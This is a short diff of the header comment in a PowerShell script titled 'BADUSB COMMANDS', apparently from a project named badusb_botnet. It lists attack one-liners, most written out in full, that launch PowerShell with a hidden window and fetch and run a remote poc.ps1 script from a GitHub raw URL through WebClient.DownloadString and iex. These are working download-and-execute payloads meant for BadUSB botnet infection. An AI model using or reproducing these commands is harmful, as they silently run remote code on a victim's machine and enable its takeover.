@@ -1,7 +1,7 @@
 <#  
 BADUSB COMMANDS:
     # Execute 
-    powershell.exe -windowstyle hidden -file this_file.ps1
+    powershell.exe -windowstyle hidden -file poc.ps1
     #Execute script from github
     iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
     PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
